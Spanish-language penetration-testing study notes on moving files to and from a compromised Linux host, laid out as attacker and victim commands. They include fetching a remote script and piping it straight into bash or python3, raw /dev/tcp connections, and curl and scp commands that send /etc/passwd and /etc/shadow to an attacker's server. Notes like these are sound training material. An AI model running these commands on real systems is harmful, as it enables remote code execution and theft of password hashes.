# ==Linux File Transfer Methods==

Linux suele tener muchas herramientas para transferir archivos.  
En ataques reales, **HTTP/HTTPS es lo más usado** (curl, wget, etc.).

---

# ==Download Methods==

## Base64

Útil cuando no hay red o la shell es limitada.

_Atacante (Pwnbox):_

```
md5sum id_rsa cat id_rsa | base64 -w 0; echo
```

_Linux víctima:_

```
echo -n 'STRING' | base64 -d > id_rsa md5sum id_rsa
```

✔ No requiere red  
⚠ Malo para archivos grandes

---

## Web Downloads (HTTP)

Los más comunes en Linux.

---

### wget

```
wget https://URL/file.sh -O /tmp/file.sh
```

---

### curl

```
curl -o /tmp/file.sh https://URL/file.sh
```

Diferencia:

- wget → `-O`
- curl → `-o`

---

## Fileless Execution

Ejecuta sin guardar en disco.

---

### curl fileless

```
curl https://URL/script.sh | bash
```

---

### wget fileless

```
wget -qO- https://URL/script.py | python3
```

✔ Muy usado en malware  
⚠ Puede crear archivos temporales según payload

---

## Bash /dev/tcp

Cuando no hay wget ni curl.

---

### Conectar

```
exec 3<>/dev/tcp/IP/80
```

---

### Enviar GET

```
echo -e "GET /file HTTP/1.1\n\n" >&3
```

---

### Leer respuesta

```
cat <&3
```

✔ Funciona con bash ≥ 2.04  
⚠ Método más manual

---

## SSH / SCP Download

SCP usa SSH para transferencias seguras.

---

### Activar SSH en atacante

```
sudo systemctl enable ssh sudo systemctl start ssh
```

Verificar:

```
netstat -lnpt
```

---

### Descargar desde remoto

```
scp user@IP:/ruta/archivo .
```

✔ Seguro  
✔ Muy común en entornos reales

---

# ==Upload Methods==

## Base64 Upload

Operación inversa.

_Linux víctima:_

```
cat file | base64 -w 0
```

_Atacante:_

```
echo STRING | base64 -d > file
```

---

## HTTP Upload (curl)

Necesitamos uploadserver.

---

### Atacante

```
sudo python3 -m pip install --user uploadserver openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'  mkdir https && cd https sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

---

### Linux víctima

```
curl -X POST https://IP/upload \   -F 'files=@/etc/passwd' \   -F 'files=@/etc/shadow' \   --insecure
```

Permite múltiples archivos  
 `--insecure` por certificado self-signed

---

## Mini Web Server (desde víctima)

Si la víctima puede servir archivos.

---

### Python3

```
python3 -m http.server
```

---

### Python2

```
python2.7 -m SimpleHTTPServer
```

---

### PHP

```
php -S 0.0.0.0:8000
```

---

### Ruby

```
ruby -run -ehttpd . -p8000
```

---

### Atacante descarga

```
wget IP:8000/file.txt
```

Puede fallar si hay firewall inbound

---

## SCP Upload

Si SSH outbound está permitido.

---

### Subir archivo

```
scp /etc/passwd user@IP:/ruta/
```

Sintaxis similar a `cp`